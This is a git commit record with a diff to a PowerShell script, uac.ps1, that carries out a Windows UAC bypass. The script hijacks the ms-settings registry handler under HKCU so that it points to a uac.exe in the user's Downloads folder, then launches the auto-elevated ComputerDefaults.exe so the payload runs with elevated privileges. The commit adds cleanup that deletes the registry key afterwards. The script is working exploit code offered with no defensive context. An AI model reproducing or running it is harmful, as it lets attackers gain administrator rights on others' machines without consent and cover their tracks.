aa16868054b1c617f110761c3d6a55c09c755455
Floop <76122284+poorkid8921@users.noreply.github.com>
2025-04-05 16:40:16 +0300

    Update uac.ps1

--- uac.ps1
+++ uac.ps1
@@ -2,3 +2,6 @@ New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
 New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
 Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "../../Users/$Env:UserName/Downloads/uac.exe" -Force
 Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+Start-Sleep -Milliseconds 1000
+Remove-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Recurse -Force
+Exit
